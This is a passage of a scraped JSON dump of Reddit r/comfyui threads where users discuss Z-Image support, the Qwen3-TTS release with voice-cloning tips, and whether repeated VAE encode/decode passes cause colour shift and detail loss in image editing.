                  "text": "it's great actually, don't get me wrong. It's just there's hyping for this and that here all the time for random bs which causes fatigue. \n\nLike, files to download, or I'm out. The lads below and above me can read all the previews they want.",
                  "score": 0,
                  "created_utc": "2026-01-26 03:42:17",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1r18rs",
              "author": "FaceDeer",
              "text": "I'm actually appreciative of this post, I was thinking of testing out HeartMula in the next day or two and this means I can now put it off a little longer to wait for the popular reaction.",
              "score": 8,
              "created_utc": "2026-01-26 03:07:10",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1r2cau",
                  "author": "iChrist",
                  "text": "I wouldn‚Äôt pass on HeartMula to be honest.\nIts limited in terms of adherence to tags and has no way of generating just instrumentals, but it can deliver bangers!",
                  "score": 4,
                  "created_utc": "2026-01-26 03:13:11",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1r5p3x",
              "author": "nymical23",
              "text": "For ambiguous tweets and speculations? Sure, that's annoying and a waste of time.\n\nBut this seems to be genuine preparations for a new model and many are already waiting for this. So, this is a good post I'd say.",
              "score": 2,
              "created_utc": "2026-01-26 03:32:21",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1rczmk",
              "author": "shiftdeleat",
              "text": "agree re:hype thing but this is actually something different and i appreciate the  info tbh",
              "score": 2,
              "created_utc": "2026-01-26 04:16:09",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qojov0",
      "title": "Z-Image Day-0 support in ComfyUI: Non-distilled, Flexible, High-Quality Image Generation",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qojov0",
      "author": "PurzBeats",
      "created_utc": "2026-01-27 17:05:45",
      "score": 147,
      "num_comments": 15,
      "upvote_ratio": 0.96,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "News",
      "permalink": "https://reddit.com/r/comfyui/comments/1qojov0/zimage_day0_support_in_comfyui_nondistilled/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o22a2l6",
          "author": "SnooPuppers4132",
          "text": "thank you",
          "score": 5,
          "created_utc": "2026-01-27 18:30:29",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o232hv5",
          "author": "tanoshimi",
          "text": "And the example template hasn't hidden all the nodes away into a subgraph - thank God!",
          "score": 11,
          "created_utc": "2026-01-27 20:35:30",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2371a8",
          "author": "badsinoo",
          "text": "what about Z-image img 2 img ?",
          "score": 2,
          "created_utc": "2026-01-27 20:55:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o23pt6s",
              "author": "deadsoulinside",
              "text": "It's not hard to modify these default workflows to add basic img2img to them. Currently downloading the model now and looking at the default workflow which is like the basic turbo one when it first came out. Running through some tests with the model now, but it's only a few nodes to drop in img2img",
              "score": 4,
              "created_utc": "2026-01-27 22:20:17",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o269arg",
                  "author": "Rough-Goal-9550",
                  "text": "yeah I agree with you",
                  "score": 1,
                  "created_utc": "2026-01-28 07:05:08",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o25qakz",
              "author": "Simple-Variation5456",
              "text": "Clip off that latent node where you put in the resolution.\nLoad image node > vae encode > to the sampler latent input that you removed before.\n\nClip in the vae to the encoder and turn down the Denoise. (0.1 - 0.5 range)",
              "score": 3,
              "created_utc": "2026-01-28 04:44:45",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o26p2nu",
              "author": "rezarNe",
              "text": "you can use the same workflow, just replace the diffusion model.\n\nso use z_image_bf16.safetensors instead of z_image_turbo_bf16.safetensors",
              "score": 1,
              "created_utc": "2026-01-28 09:26:14",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o278yzl",
                  "author": "BeatnologicalMNE",
                  "text": "This produces some crazy results for me, pretty much jibberish images. Not sure what's going on.",
                  "score": 1,
                  "created_utc": "2026-01-28 12:12:35",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o24kije",
          "author": "Traveljack1000",
          "text": "These models are great if you don't have enough vram, but I did a test between 4 different models today on my PC with an RTX5060ti 16gb and 64gb DDR4 Ram. My workflow with Flux t2i was simply the best.",
          "score": 2,
          "created_utc": "2026-01-28 00:54:10",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2687dk",
          "author": "UnseenLayers",
          "text": "amazing!",
          "score": 2,
          "created_utc": "2026-01-28 06:56:16",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o26hzeo",
          "author": "alenchijip",
          "text": "I just keep generating noise only image using this",
          "score": 2,
          "created_utc": "2026-01-28 08:20:25",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o26e4u1",
          "author": "IanAA0813",
          "text": "Why I saw \"Given normalized\\_shape=\\[2560\\], expected input with shape \\[\\*, 2560\\], but got input of size\\[1, 512, 12288\\]\" problem in the Ksampler?",
          "score": 1,
          "created_utc": "2026-01-28 07:46:32",
          "is_submitter": false,
          "replies": [
            {
              "id": "o29ofpz",
              "author": "Fineous40",
              "text": "This can come from VAE issues",
              "score": 1,
              "created_utc": "2026-01-28 19:09:59",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qme5g3",
      "title": "Qwen3-TTS has been officially released as open source, boasting powerful features such as speech generation, voice design, and voice cloning.",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qme5g3",
      "author": "Daniel81528",
      "created_utc": "2026-01-25 08:57:56",
      "score": 147,
      "num_comments": 31,
      "upvote_ratio": 0.97,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qme5g3/qwen3tts_has_been_officially_released_as_open/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1lc0n9",
          "author": "n0714",
          "text": "is this for ComfyUI?",
          "score": 9,
          "created_utc": "2026-01-25 09:41:54",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1n9v1i",
              "author": "Paganator",
              "text": "[This GitHub page](https://github.com/1038lab/ComfyUI-QwenTTS) has the ComfyUI nodes.",
              "score": 9,
              "created_utc": "2026-01-25 16:51:13",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1mw60q",
          "author": "MisterBlackStar",
          "text": "Leaving my ComfyUI nodes here just in case, as a web UI isn't really related with this sub theme [ComfyUI-Qwen3-TTS](https://github.com/DarioFT/ComfyUI-Qwen3-TTS)",
          "score": 8,
          "created_utc": "2026-01-25 15:51:55",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1nhu3t",
              "author": "TopTippityTop",
              "text": "Do you know if there's any way to do realtime streaming in comfy?¬†",
              "score": 2,
              "created_utc": "2026-01-25 17:25:27",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1le4gv",
          "author": "PleasantAd2256",
          "text": "Comfyui workflow?",
          "score": 7,
          "created_utc": "2026-01-25 10:00:42",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1l7mj4",
          "author": "Gloomy-Radish8959",
          "text": "Exciting!",
          "score": 2,
          "created_utc": "2026-01-25 09:02:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1nhnb6",
          "author": "TopTippityTop",
          "text": "Does anyone know whether there's a way to do realtime streaming in comfy? How does that aspect work?",
          "score": 2,
          "created_utc": "2026-01-25 17:24:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1o4wj6",
          "author": "OkBill2025",
          "text": "I'll stick with VibeVoice",
          "score": 2,
          "created_utc": "2026-01-25 19:01:00",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1obypa",
              "author": "MrWeirdoFace",
              "text": "Question, can you remind me what happened with it?  Rather I never got around to testing it but I know there was some controversy and they temporarily pulled it to replace the models.   I've been sitting a a pre-pull copy but haven't taken a look.",
              "score": 3,
              "created_utc": "2026-01-25 19:31:54",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1qy4km",
                  "author": "OkBill2025",
                  "text": "It's from the previous version. I don't know what happened, but I'm still using the old model.",
                  "score": 1,
                  "created_utc": "2026-01-26 02:51:02",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1lhsug",
          "author": "Mirandah333",
          "text": "Anyone was able to clone a voice? For me it fails completely...",
          "score": 2,
          "created_utc": "2026-01-25 10:33:21",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1lv1s7",
              "author": "aeroumbria",
              "text": "It appears to work slightly better with captioned input vs audio alone, but it is really only similar in vocal quality and not speech patterns and mannerism as well, like VibeVoice. I suppose the custom voice model is supposed to pick up the task of adding these qualities, but not sure if these two modes can be combined together.",
              "score": 4,
              "created_utc": "2026-01-25 12:24:54",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1lw5r8",
              "author": "JScoobyCed",
              "text": "I have been using Spark-TTS (self-hosted) in a project last year and it was amazing. You just need a 5-10 second audio sample. Make sure the audio sample rate is 16k, preferably .wav, and no pause/silence in it (or it will generate voice with silence parts)",
              "score": 2,
              "created_utc": "2026-01-25 12:33:21",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1n8x8c",
              "author": "HolidayWheel5035",
              "text": "I‚Äôm using comfyui nodes but yes the clone works perfect.   Way better than vibevoice imho",
              "score": 2,
              "created_utc": "2026-01-25 16:47:11",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1n1d50",
              "author": "fartshitcumpiss",
              "text": "The voice cloner works perfectly for me, you just need to provide an accurate transcript of the sample. If you're having issues with the cloned voice sounding bland, crank up the temperature and top\\_k, and maybe the repetition penalty. The weirder the voice, the more temp and top\\_k you need. Also, seed matters, so just generate repeatedly with random seeds until you get a good one.",
              "score": 3,
              "created_utc": "2026-01-25 16:14:36",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1n3tgs",
                  "author": "Mirandah333",
                  "text": "Thnaks, need to try more and insist more. It was a first bad impression",
                  "score": 2,
                  "created_utc": "2026-01-25 16:25:04",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1p87qo",
              "author": "niord",
              "text": "Works perfect without extra caption.\n\nJust remember to have the 'something x vectors only' switched to true on the node if you feed it with audio and no caption.",
              "score": 1,
              "created_utc": "2026-01-25 21:53:15",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1lpkwz",
              "author": "Daniel81528",
              "text": "How could that be? My tests are all working fine, what's wrong with you?",
              "score": -3,
              "created_utc": "2026-01-25 11:41:14",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1lrhpb",
                  "author": "Mirandah333",
                  "text": "It produces a voice that changes over time",
                  "score": 1,
                  "created_utc": "2026-01-25 11:56:50",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1mndp9",
          "author": "XonikzD",
          "text": "Is it as good a index-tts2?",
          "score": 1,
          "created_utc": "2026-01-25 15:11:24",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1p2f5a",
          "author": "Mythril_Zombie",
          "text": "How fast is it?",
          "score": 1,
          "created_utc": "2026-01-25 21:27:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1p9dgu",
              "author": "niord",
              "text": "On my laptop (rtx 4080 mobile 12gb) a 30s TTS takes 3-5min to 'render' (that is with around 1m voice sample as base).",
              "score": 2,
              "created_utc": "2026-01-25 21:58:29",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1px5si",
                  "author": "harrro",
                  "text": "You sure it's using the GPU? It should be way faster than that.",
                  "score": 2,
                  "created_utc": "2026-01-25 23:46:41",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o298mri",
          "author": "Just-Drew-It",
          "text": "It's extremely impressive from a quality standpoint, but there's no getting it working for actual conversations. It's exponentially slower than the claims, imo",
          "score": 1,
          "created_utc": "2026-01-28 18:02:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1v6us3",
          "author": "ovannesag",
          "text": "https://preview.redd.it/2haq5tbbmqfg1.png?width=1043&format=png&auto=webp&s=42c4cb96012a52283bbf3f457319d07ba2344a7e\n\nI'm using the portable version",
          "score": 0,
          "created_utc": "2026-01-26 18:33:10",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qkog35",
      "title": "Colour shift is not caused by the VAE",
      "subreddit": "comfyui",
      "url": "https://i.redd.it/0lhl6roc43fg1.png",
      "author": "Luke2642",
      "created_utc": "2026-01-23 11:33:33",
      "score": 133,
      "num_comments": 59,
      "upvote_ratio": 0.94,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qkog35/colour_shift_is_not_caused_by_the_vae/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o18mt0i",
          "author": "afinalsin",
          "text": ">If you pass it through six times you get a slight fading effect, that is all\n\nNo, that is not all. The VAE will degrade the details of the image. Below is a bunch of comparisons between input image and 8x trips through a VAE encode/decode cycle (scroll to zoom in):\n\n[Here is a robot](https://imgsli.com/NDQ0NjY3).\n\n[Here is an anime creature.](https://imgsli.com/NDQ0NjY4)\n\n[Here is a random demon woman](https://imgsli.com/NDQ0Njcy).\n\n[Here is a Fernando Alonso](https://imgsli.com/NDQ0Njcx).\n\n[Here is a lower resolution Fernando Alonso](https://imgsli.com/NDQ0Njgy).\n\nYour methodology isn't great because you are running a single 1080 x 1935 image through the VAE so the loss of detail is much less noticeable. When you run a 1 megapixel image through the same process (like you would with image editing, for example) the degradation is much more apparent. Even if the the colors remain basically the same, the destruction of details is too much to be dismissed as a \"slight fading effect\". \n\n---\n\n>It's some sort of groupthink, when no-one actually tested it.\n\nOkay, let's test it. I'll create an image from two inputs, and run 8 edits on consecutive outputs. \n\n[Here](https://i.postimg.cc/dJvcwHqW/grid-00027.png) I make all edits directly with latents, so it was only one encode/decode cycle. 0 Degradation.\n\n[Here](https://i.postimg.cc/R472s7cq/grid-00028.png) I make all edits with images in an encode/decode cycle, changing the seed each prompt. Nothing super noticeable, if at all. There might be if I had static elements that are supposed to remain untouched by the model. Test that next.\n\n[Here](https://i.postimg.cc/dwYxyhz0/grid-00029.png) I make all edits with images in an encode/decode cycle and keep the seed static. There are tons of errors, and they compound from one gen to the next. The wings and midsection are the most noticeable, but there are errors all over the place. So, I can confidently say leaving the seed static from gen to gen will fuck up your image. Now lets test that VAE cycle.\n\n---\n\n[Here](https://i.postimg.cc/rcC97QPW/vae-00001.png) is a run of edits using the VAE.\n\n[Here](https://i.postimg.cc/tytz82M6/vaeless-00001.png) is a run of edits using only latents.\n\nBoth of these runs are the exact same seed, exact same prompts. The differences are subtle, but the result is clear. [Here is the final output](https://imgsli.com/NDQ0NzAw). \n\nCompare the detail on the house and the tree above it on the mug. Every edit had a clear instruction: \"Leave the coffee mug exactly as it is.\" And it did, but the VAE got in the way and degraded the details.\n\nSo yeah, it was some sort of \"groupthink\", but the group was thinking based on knowledge gained over years of doing this. The color degradation was likely based on an unchanging seed, but passing into and out of latent space will still fuck up your image so it's best to avoid it as much as possible. \n\nEven a VAE as good as the Flux2 Vae will fuck up your image with enough cycles, because the tiny mistakes compound with each other. If I ran that mug through ten more edits the results would be even more stark. That's also why you mask when you inpaint, otherwise your final result ends up like mud.",
          "score": 32,
          "created_utc": "2026-01-23 14:03:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18o6fq",
              "author": "Luke2642",
              "text": "You make some good points, but I have no idea what your workflow is for each of those edit images or what you're trying to prove. There is a slight quality/detail loss each you encode/decode with the VAE, I never said there wasn't.\n\nThe OP was doing 3 edits and seeing colour shift on that exact image. The colour shift was not caused by the VAE, as demonstrated.",
              "score": 3,
              "created_utc": "2026-01-23 14:10:34",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18rwcv",
                  "author": "afinalsin",
                  "text": "Just reread that thread, and we both overlooked something very simple: \n\n>\"I am using the default workflow. Just removed the \"ImageScaleToTotalPixels\" node to keep the output reso same as input.\"\n\nThe input resolution of OP's image is 1536 x 2752. Homie was trying to gen 2x base resolution. \n\nEven with that full resolution, [I couldn't replicate the errors](https://i.postimg.cc/WsgrJ7Jt/Comfy-UI-0003.webp). The image deteriorated, as to be expected, but the color wasn't one of them, so I'm stumped.\n\nEdit to answer edit:\n\n>what you're trying to prove\n\nJust countering your statement that \"you only get a slight fading\". \n\n>There is a slight quality/detail loss each you encode/decode with the VAE, I never said there wasn't.\n\nI see now that you were referring strictly to color, but that statement can easily be read as the fading being the only detrimental effect at being passed in and out of the VAE. My reading of that made it seem like you did indeed say there wasn't a quality/detail loss, which is what I was countering. My bad. On a completely related note, I hate English. \n\nStill, if someone reads this and gets something out of it, job done, I don't mind arguing against a point I've misinterpreted.",
                  "score": 6,
                  "created_utc": "2026-01-23 14:29:32",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o180u4y",
          "author": "Most_Way_9754",
          "text": "Can you explain why the laten multiply removes the fade? Should we include this after the vae decode on a regular generation?",
          "score": 10,
          "created_utc": "2026-01-23 11:48:12",
          "is_submitter": false,
          "replies": [
            {
              "id": "o183x1o",
              "author": "Luke2642",
              "text": "There must be something in the encode/decode that is squashing the weights or pixel values slightly each time, or, it could be a cumulative rounding error, but that seems unlikely. Latent space geometry is hard to conceptualise, but I guess that the absolute magnitudes somehow control the overall contrast, and the relative magnitudes control the features.\n\nIf you want to boost the contrast, yeah, multiply is a quick and dirty way to do it?",
              "score": 7,
              "created_utc": "2026-01-23 12:10:49",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o190kqt",
                  "author": "RickyRickC137",
                  "text": "Is there a cleaner way, then?\n\nAlso, does it work with qwen edit?",
                  "score": 1,
                  "created_utc": "2026-01-23 15:12:48",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o183kqt",
              "author": "Character-Bend9403",
              "text": "I wanna know aswell i am a beginner and would love to know  the answer to this , if you feel explaining it.",
              "score": 1,
              "created_utc": "2026-01-23 12:08:20",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o18ilex",
          "author": "Justify_87",
          "text": "https://github.com/Jelosus2/comfyui-vae-reflection\n\n\nThis may be interesting for you",
          "score": 9,
          "created_utc": "2026-01-23 13:41:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18pg1u",
              "author": "Luke2642",
              "text": "That is very interesting to me, thank you!",
              "score": 1,
              "created_utc": "2026-01-23 14:17:01",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1ibubl",
              "author": "Nexustar",
              "text": "I thought i was looking at a Rothko at first.",
              "score": 1,
              "created_utc": "2026-01-24 22:18:45",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o184lpz",
          "author": "infearia",
          "text": "I don't claim to understand fully what you're talking about, but it seems you're onto something. There are times I notice a HUGE increase in brightness after only ONE single edit operation. Maybe you could open an issue or a discussion on ComfyUI's official GitHub repo?",
          "score": 7,
          "created_utc": "2026-01-23 12:15:41",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o187wbo",
          "author": "TBG______",
          "text": "Pixel space ranges from 0 to 255, while latent space is normalized to 0‚Äì1 float32 in best cases and compressed by a factor of 8. Rounding errors are common, but they do not cause image saturation like in these examples.\n\nSure, I didn‚Äôt test this with Flux 2, but it looks like the Flux model tends to add a bit more saturation to the input image on each pass. My suspicion is that Flux has a built-in corrector that works ‚Äúwell‚Äù on the first pass but then accumulates over subsequent passes. The problem is that it seems to be applied only to unchanged areas, so ideally your correction pass should also target only those areas.\n\nHave you tried whether the same behavior happens with img2img without inpainting? Did you keep the same seed on each pass, or did you change it? In any case, it‚Äôs usually best to do your generation first, then crop and stitch the original background back into the image using the same mask, and only then proceed with the next pass.",
          "score": 3,
          "created_utc": "2026-01-23 12:38:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18bigi",
              "author": "TheSquirrelly",
              "text": "SwarmUI has some color correction options when using flux inpainting.  I wonder if it's a similar issue at all.  Though it looks like it applies this through a custom \"SwarmImageCompositeMaskedColorCorrecting\" node.\n\nhttps://preview.redd.it/ld6ri81rj3fg1.png?width=1229&format=png&auto=webp&s=2dbcc1be2748357a97259927089c74c88bf90f8c",
              "score": 1,
              "created_utc": "2026-01-23 13:00:51",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o18s54n",
              "author": "Formal-Exam-8767",
              "text": "> while latent space is normalized to 0‚Äì1 float32\n\nAre you sure? I thought latent tensor values are unbound, with approximately zero‚Äëmean.",
              "score": 1,
              "created_utc": "2026-01-23 14:30:47",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1azkx7",
              "author": "Geekn4sty",
              "text": "Isn't the latent tensor autocast as the same dtype of the model weights? They must undergo matrix multiplication in the forward pass, I'm pretty sure torch will not allow them to have mismatched precision.",
              "score": 1,
              "created_utc": "2026-01-23 20:38:00",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1ecllm",
                  "author": "TBG______",
                  "text": "That‚Äôs correct. \n\n* **Latent ‚Üí pixel conversion happens** ***after*** **decoding via the VAE**\n* The VAE decoder output is:\n   * float (usually fp16/fp32)\n   * then clamped / scaled to `[0,1]`\n   * *then* converted to 8-bit (0‚Äì255) for images (bottleneck)",
                  "score": 1,
                  "created_utc": "2026-01-24 09:11:54",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o184q4b",
          "author": "Minimum-Let5766",
          "text": "When inpainting flux1.dev, I get color fading in the final image of the non-masked area .  But the masked area which was manipulated remains at original saturation, so it never looks quite right.  Hopefully this latent multiply can help.",
          "score": 2,
          "created_utc": "2026-01-23 12:16:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o18ge1r",
          "author": "ReasonablePossum_",
          "text": "Tried with the latentmultiply at 2, it gives me an oversaturated and degraded output\n\nhttps://preview.redd.it/0emk7lnmp3fg1.png?width=293&format=png&auto=webp&s=4de3a2264f64303ab542ea289274a7ccf70f5bbc",
          "score": 2,
          "created_utc": "2026-01-23 13:29:13",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18qg1m",
              "author": "TBG______",
              "text": "If you multiply 0.2% of any color by 2, you simply get 0.4%. That‚Äôs just post-processing, not an actual solution.",
              "score": 2,
              "created_utc": "2026-01-23 14:22:07",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o18ix6a",
              "author": "Luke2642",
              "text": "I have no idea what your workflow is. Are simply replicating encode-decode 6 times for fun?",
              "score": 1,
              "created_utc": "2026-01-23 13:42:57",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o18oorc",
              "author": "Cute_Ad8981",
              "text": "It depends on the vae. For example I had to use 0.75 with the latent multiply for wan 2.2 5b. OP is using 2.0 after 3-4 encodings/decodings. maybe test 1.25 or 0.75 and adjust.",
              "score": 1,
              "created_utc": "2026-01-23 14:13:10",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o18sy7i",
              "author": "Formal-Exam-8767",
              "text": "That's expected since it's a hack. There is no semantic explanation what multiplying every value by 2 in latent space means.",
              "score": 1,
              "created_utc": "2026-01-23 14:34:57",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o18jctv",
          "author": "pwillia7",
          "text": "This guy diffuses",
          "score": 2,
          "created_utc": "2026-01-23 13:45:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18p8oq",
              "author": "Luke2642",
              "text": "Technically this is just encoding and decoding üòú",
              "score": 1,
              "created_utc": "2026-01-23 14:15:59",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18pbu4",
                  "author": "pwillia7",
                  "text": "ha -- fair play",
                  "score": 1,
                  "created_utc": "2026-01-23 14:16:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1fqush",
          "author": "Clasyc",
          "text": "Commenting not specifically to OP, but with some general points for other commenters. I see a lot of people missing a key piece of information when talking about moving forward with VAEs.\n\nLatent ‚Üí Image (VAE Decode) is a deterministic operation and does not lose information relative to the latent. Image ‚Üí Latent (VAE Encode) is a lossy operation.\n\nSo it‚Äôs kinda obvious that if you repeatedly chain multiple VAE encode + VAE decode operations, you will eventually lose more and more information. At the same time, you start ‚Äúsaturating‚Äù specific patterns that the VAE is good at resolving and encoding. As a result, overall quality degrades, and the image becomes more and more sharp, contrasty, and ‚ÄúAI-looking‚Äù in the end.\n\nIt doesn‚Äôt matter what tricks you do between those operations - once you keep re-encoding, you are inevitably losing original information.",
          "score": 2,
          "created_utc": "2026-01-24 15:16:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o18564l",
          "author": "ANR2ME",
          "text": "Nice finding üëç\n\nDo we need lower multiplier value if it was for the 2nd image? ü§î since 2.0 is for the 3rd image, which already faded twice.",
          "score": 1,
          "created_utc": "2026-01-23 12:19:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o185e05",
          "author": "Formal-Exam-8767",
          "text": "Do VAE encode, modify part of the image (while in latent space), do VAE decode, whole image tone changes/shifts.",
          "score": 1,
          "created_utc": "2026-01-23 12:21:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o185tzr",
              "author": "Luke2642",
              "text": "You're confusing local and global features in the latent space. I mentioned in the other post that latent geometry is complex!",
              "score": 1,
              "created_utc": "2026-01-23 12:24:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18bmej",
                  "author": "Formal-Exam-8767",
                  "text": "Yes, and you can't replicate color tone shift without changing the image in latent space. Same thing happens with tiled VAE decode.",
                  "score": 1,
                  "created_utc": "2026-01-23 13:01:32",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o187m7i",
          "author": "TidalFoams",
          "text": "I've always thought about it like the ksampler is making a copy of a very slightly altered copy (like a game of telephone). Any problems it introduces (color change in this case) get amplified in the next pass. It's not just the color that changes but subtle detail gets lost over iterations through a ksampler. If you do it enough times you get monster people.",
          "score": 1,
          "created_utc": "2026-01-23 12:36:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o18biw5",
          "author": "Cute_Ad8981",
          "text": "Your post is interesting, because I'm searching for an easy solution for that problem.  \nI'm using latent multiply too and it helped, but are you sure this is fully lossless and can be applied to all different vaes (wan for example)? I often chained multiple samplers for video extension and it was pretty hard to pinpoint the exact value for latent multiply.",
          "score": 1,
          "created_utc": "2026-01-23 13:00:55",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1bw9c4",
              "author": "physalisx",
              "text": "It is absolutely not and OP is completely wrong. VAE encode/decode will absolutely degrade your image, there is no \"lossless\" way around that.",
              "score": 2,
              "created_utc": "2026-01-23 23:16:38",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o18jdiz",
              "author": "Luke2642",
              "text": "It's going to be trial and error.\n\nComfyUI will auto-detect the model type in the ksampler and apply the correct latent space scale and shift before doing the model denoising, then rescale and shift it afterwards. So there's lots of opportunity for shifts to creep in.",
              "score": 1,
              "created_utc": "2026-01-23 13:45:23",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18o17i",
                  "author": "ZenEngineer",
                  "text": "I wonder if there's some way to test that. What happens if you run a few steps with 0 denoise? Would ksampler still scale and shift?",
                  "score": 1,
                  "created_utc": "2026-01-23 14:09:49",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1a43jo",
          "author": "Spare_Ad2741",
          "text": "would same methodology apply to video creation also?",
          "score": 1,
          "created_utc": "2026-01-23 18:12:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1agx3k",
          "author": "Simple-Variation5456",
          "text": "its crazy to see what people come up with, struggle with and take minutes to correct and edit in their workflows while oldboi photoshop just did it better 20 years ago.  \nI generate in comfyui (or directly in photoshop with firefly fill / flux / nano) and copy the output into photoshop as a layer, can copy already made masks and can refine and edit everything on seperate layers whenever i want.  \nHow you even precisely pick a color for certain things?  \nCan you even mask stuff above 4-8k?  \n  \nDo people actually edit their outputs over and over?  \nI'm already getting mad when NanoPro/Flux2Pro/Seedream 4.5 just slightly change the image even tho telling or masking areas to keep and only change x.  \nThis sounds worse than people had to cut out stuff and glue them together physically (analog) before photoshop was a thing.",
          "score": 1,
          "created_utc": "2026-01-23 19:10:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1bh215",
          "author": "MidSolo",
          "text": "Could you have made it any more difficult to figure out what is going on in your workflow?",
          "score": 1,
          "created_utc": "2026-01-23 21:59:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1biv7d",
              "author": "Luke2642",
              "text": "Load image\nEncode\nDecode\nEncode\nDecode\nEncode\nDecode\nPreview\nEncode\nDecode\nEncode\nDecode\nEncode\nDecode\nPreview¬†",
              "score": 1,
              "created_utc": "2026-01-23 22:08:28",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1xfi06",
                  "author": "Far_Buyer_7281",
                  "text": "oi if you say it like that, could you do it again witht he image first scaled to 1 megapixel?",
                  "score": 1,
                  "created_utc": "2026-01-27 00:44:24",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1bpd94",
          "author": "superstarbootlegs",
